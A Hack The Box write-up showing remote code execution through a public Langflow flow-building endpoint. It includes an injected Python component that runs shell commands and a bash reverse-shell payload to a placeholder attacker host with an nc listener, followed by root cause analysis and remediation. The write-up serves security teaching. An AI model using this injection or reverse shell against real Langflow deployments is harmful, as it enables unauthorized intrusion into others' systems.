+++
title = "Hack The Box — Langflow RCE Write-up"
date = 2026-08-23
description = "A technical walkthrough of a Hack The Box machine involving Langflow, public flow analysis, remote code execution, and root cause analysis."
[taxonomies]
tags = ["Hack The Box", "Web Security", "Langflow", "RCE", "Penetration Testing"]
+++

## 1. Introduction

As part of the Hack The Box Event, I worked on a Linux machine that exposed an interesting web application over HTTPS. During enumeration, I discovered a subdomain, `flow.fireflow.htb`, which appeared to host a ChatGPT-style AI interface.

At first, the application seemed to be a simple AI chatbot. However, every prompt returned the same response:

> "We are extremely sorry, this is still under development. Please, check back soon..."

Instead of focusing on the chatbot prompts, I moved to analyzing the application's backend requests with Burp Suite. This revealed that the application was built around Langflow and exposed a public flow-building endpoint.

Further investigation showed that the client could influence the flow definition processed by the backend. This eventually led to the discovery and confirmation of a Remote Code Execution (RCE) vulnerability.

## 2. Initial Enumeration

### 2.1 Nmap

The initial TCP scan identified:

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
443/tcp   open     https
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
```

The two immediately interesting services were SSH on port 22 and HTTPS on port 443.

### 2.2 Service Enumeration

A targeted scan produced:

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp open  ssl/http nginx

|_http-title: FireFlow — Task Force Nightfall

| ssl-cert:
| Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
```

The TLS certificate revealed both `fireflow.htb` and the wildcard `*.fireflow.htb`, suggesting virtual hosts/subdomains.

## 3. Discovering `flow.fireflow.htb`

One interesting subdomain discovered during enumeration was:

```text
flow.fireflow.htb
```

Opening it revealed what appeared to be an AI/chat application.

However, every prompt returned:

```text
We are extremely sorry, this is still under development. Please, check back soon...
```

This made prompt injection unlikely to be the useful attack path, so I switched to inspecting the application's HTTP traffic.

## 4. Burp Suite Analysis

Intercepting the application request revealed a public Langflow build endpoint:

```http
POST /api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?start_component_id=ChatInput-608En&log_builds=false&event_delivery=streaming HTTP/1.1
Host: flow.fireflow.htb
Content-Type: application/json
Content-Length: 56910
Origin: https://flow.fireflow.htb
Connection: keep-alive

{
  "files": [],
  "data": {
    "nodes": [
      {
        "data": {
          "id": "ChatInput-608En",
          "node": {
            "base_classes": ["Message"],
            "category": "inputs",
            "display_name": "Chat Input",
            ...
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "from lfx.base.data.utils import IMG_FILE_TYPES, TEXT_FILE_TYPES\n..."
              }
            }
          },
          "selected_output": "message",
          "showNode": true,
          "type": "genericNode"
        },
        "id": "ChatInput-608En"
      },

      {
        "data": {
          "id": "ChatOutput-gfxpD",
          "node": {
            "base_classes": ["Message"],
            "category": "outputs",
            "display_name": "Chat Output",
            ...
          },
          "showNode": false,
          "type": "ChatOutput"
        },
        "id": "ChatOutput-gfxpD"
      },

      {
        "id": "TextOperations-yvwhG",
        "type": "genericNode",
        "position": {
          "x": 1659.5276329126982,
          "y": 312.39878572225075
        },
        "data": {
          "node": {
            "display_name": "Text Operations",
            ...
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "import contextlib\nimport re\nfrom typing import Any\n..."
              },
              ...
              "operation": {
                "value": [
                  {
                    "name": "Text Replace",
                    "icon": "replace",
                    "chosen": false,
                    "selected": false
                  }
                ]
              },
              "search_pattern": {
                "value": "^.*$"
              },
              "replacement_text": {
                "value": "We are extremely sorry, this is still under development. Please, check back soon..."
              },
              "use_regex": {
                "value": true
              }
            }
          }
        }
      }
    ],
    "edges": [
      ...
    ]
  },
  "inputs": {
    "input_value": "hello",
    "session": "5941a110-408d-5602-a30a-c818bd1baac3",
    "client_request_time": 1786865541862
  }
}
```

The request also included parameters such as:

```text
start_component_id=ChatInput-608En
log_builds=false
event_delivery=streaming
```

Most importantly, the JSON body contained a complete flow definition under:

```text
data.nodes
```

The flow included component metadata, templates, and code-related data.

The suspicious field was:

```text
data.nodes[].data.node.template.code.value
```

This raised the key security question:

> If the server accepts the flow definition from the client, can a client-controlled custom component cause the backend to execute attacker-controlled Python?

## 5. Understanding the Flow

The original flow was effectively:

```text
ChatInput
    ↓
TextOperations
    ↓
ChatOutput
```

The `TextOperations` component replaced the input with the fixed "under development" message. This explained why every prompt received the same response.

More importantly, the client was sending the flow definition to the backend rather than merely sending a chat message.

## 6. Vulnerability Discovery

I tested whether the public build endpoint would accept a custom component.

The first attempt produced:

```text
ValueError: Vertex Exploit not found

...

AttributeError:
'ComponentVertex' object has no attribute 'display_name'
```

Although the attempt failed, the traceback confirmed that the server was processing the attacker-supplied component as part of Langflow's graph-building process.

After correcting the component structure, I submitted a minimal custom component named:

```text
Exploit-001
```

The server accepted and executed it.

## 7. Confirming Python Code Execution

The successful response contained:

```json
{
  "event": "vertices_sorted",
  "data": {
    "ids": ["Exploit-001"],
    "to_run": ["Exploit-001"]
  }
}
```

followed by:

```text
"valid": true
```

and the component returned:

```json
{
  "status": "ok"
}
```

This confirmed that the custom component was successfully constructed and executed.

## 8. Confirming OS Command Execution

I then used a controlled OS-level test in Request Body Parameter:

```python
"nodes": [
      {
        "data": {
          "id": "ChatInput-608En",
          "node": {
            "base_classes": ["Message"],
            "category": "inputs",
            "display_name": "Chat Input",
            ...
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "value": "import subprocess\n\nresult = subprocess.check_output([\"sh\", \"-c\", \"id && hostname && pwd\"], text=True)\n\nreturn Data(data={\"result\": result})"
                }
              }
            }
          },
```

The server returned:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
/var/lib/langflow
```

Then after i Test This demonstrated:

- Python code execution
- OS command execution
- Execution as `www-data`
- Target hostname `fireflow`
- Working directory `/var/lib/langflow`

The demonstrated attack chain was:

```text
Client-controlled flow
        ↓
Custom Python component
        ↓
Python execution
        ↓
OS command execution
        ↓
www-data
```

At this point, the issue was confirmed as Remote Code Execution.

## 9. Reverse Shell Payload

After confirming command execution, I used the same code-execution primitive to establish an interactive shell back to the testing machine.

The relevant component method was changed to:

```python
def r(self) -> Data:
    import subprocess

    subprocess.Popen([
        "bash",
        "-c",
        "bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/4444 0>&1"
    ])

    return Data(data={"status": "shell_started"})
```

The corresponding JSON field was:

```JSON
"template": {
  "code": {
    "type": "code",
    "value": "def r(self) -> Data:\n    import subprocess\n\n    subprocess.Popen([\"bash\", \"-c\", \"bash -i >& /dev/tcp/ATTACKER_MACHINE_IP/4444 0>&1\"])\n\n    return Data(data={\"status\": \"shell_started\"})"
  }
}
```

With a listener on the Attacker machine:

```bash
nc -lvnp 4444
```

the callback provided a shell running as: ```bash www-data```

## 10. Root Cause Analysis

The core problem was a broken trust boundary.

A public flow should conceptually work like:

```text
Unauthenticated user
       ↓
Request an approved flow
       ↓
Server loads the trusted flow definition
       ↓
Execute the approved flow
```

The vulnerable behavior instead allowed the client to influence the flow definition used during construction:

```text
Unauthenticated user
       ↓
Public flow endpoint
       ↓
Client-controlled flow definition
       ↓
Custom component/code
       ↓
Backend builds the supplied component
       ↓
Python execution
       ↓
OS command execution
```

The root cause was therefore **improper trust of client-controlled flow data combined with execution of custom Python code without an adequate isolation boundary**.

The custom Python component feature may be legitimate for trusted users, but exposing that capability through a public flow-building path creates a dangerous security boundary.

## 11. Demonstrated Security Impact

Based only on what was actually demonstrated, an attacker could:

- influence the flow submitted to the public build endpoint;
- supply a custom component;
- execute arbitrary Python code;
- execute OS commands;
- execute those commands as `www-data`.

The confirmed execution context was:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
fireflow
/var/lib/langflow
```

This write-up intentionally does not cover subsequent privilege escalation or claim root execution as part of this finding.

## 12. Recommended Remediation

The fundamental fix is to repair the trust boundary.

### Do not trust client-supplied executable flow definitions

A public flow should reference a server-side trusted flow definition rather than allowing an unauthenticated client to replace component definitions or Python code.

### Separate execution from flow creation

Public users should be able to execute an approved flow without being able to construct arbitrary components.

Flow creation, editing, and custom-code functionality should require appropriate authentication and authorization.

### Restrict arbitrary Python execution

If custom Python is genuinely required, execute it inside a properly designed isolation boundary with:

- least-privilege OS accounts;
- restricted filesystem access;
- restricted network access;
- minimal Linux capabilities;
- resource limits.

### Add security tests

Test specifically that:

- public users cannot modify flow definitions;
- custom component code cannot be injected through API requests;
- executable fields cannot be controlled by untrusted clients;
- graph construction cannot execute attacker-controlled code.

## 14. Lessons Learned

### Don't focus only on the visible interface

The chatbot initially appeared broken, but the important attack surface was behind the interface.

### Inspect HTTP requests

The key discovery came from examining the API request rather than continuing to experiment with prompts.

### Identify what the client controls

The critical question was:

> Which values supplied by the browser does the server actually trust?

### Trace data into execution

The security impact became clear when the path was:

```text
User-controlled data
   ↓
Flow definition
   ↓
Component/code definition
   ↓
Python interpreter
   ↓
OS
```

### Prove impact safely

The RCE was confirmed using controlled commands such as:

```text
id
hostname
pwd
```

rather than making unsupported claims about impact.

## 15. Conclusion

FireFlow was a good example of why modern AI applications should not be tested only through their conversational interface.

The investigation started with a chatbot that always returned the same message. By moving one layer deeper and inspecting the application's HTTP traffic, I discovered a public Langflow flow-building endpoint that accepted client-controlled flow data.

The key security issue was the trust placed in that data when constructing executable custom components. By controlling the component code, I was able to demonstrate Python execution followed by OS command execution as `www-data` on the FireFlow host.

The main lesson is simple:

> **Don't just test what the application says. Test what the backend does with what you send it.**
